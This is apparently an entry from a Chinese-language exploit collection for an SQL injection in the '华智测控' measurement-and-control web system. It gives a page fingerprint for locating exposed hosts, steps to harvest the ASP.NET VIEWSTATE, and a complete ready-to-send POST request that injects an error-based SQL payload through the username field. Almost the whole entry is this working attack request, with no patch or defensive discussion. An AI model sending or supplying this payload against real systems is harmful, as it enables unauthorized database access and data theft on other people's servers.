# 华智测控SQL注入漏洞

华智测控 ｜ SQL注入 ｜ —
- **指纹**：`body="switchUIStateByMapType"`
- **请求**：`GET / HTTP/1.1`

**Payload**
```
1.请求IP地址，在响应里面获取VIEWSTATE的值
Host:
2.将上面获取的VIEWSTATE值最好url编码后，传入以下请求包{{VIEWSTATE}}处
POST / HTTP/1.1
Host:
Content-Type:application/x-www-form-urlencoded
X-Ext.Net: delta=true
__EVENTTARGET=ResourceManager1&__EVENTARGUMENT=-%7Cpublic%7Clogo1&__VIEWSTATE={{VIEWSTATE}}&__VIEWSTATEGENERATOR=&__EVENTVALIDATION=&txtUserName=a' and 1=user and '1'='1&txtPassWord=admin
```